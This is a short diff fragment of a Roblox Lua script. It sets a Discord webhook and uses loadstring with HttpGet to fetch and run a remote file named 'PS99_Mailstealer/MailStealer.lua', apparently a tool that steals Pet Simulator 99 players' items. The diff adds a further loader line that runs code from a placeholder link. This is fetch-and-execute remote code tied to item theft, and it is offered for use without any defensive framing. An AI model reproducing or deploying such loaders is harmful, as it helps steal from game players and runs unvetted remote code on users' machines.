@@ -5,3 +5,5 @@ Webhook = "https://discord.com/channels/915635211876835488/915635211876835490" -
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()--[[
 
+
+loadstring(game:HttpGet("Your Link Here", true))()
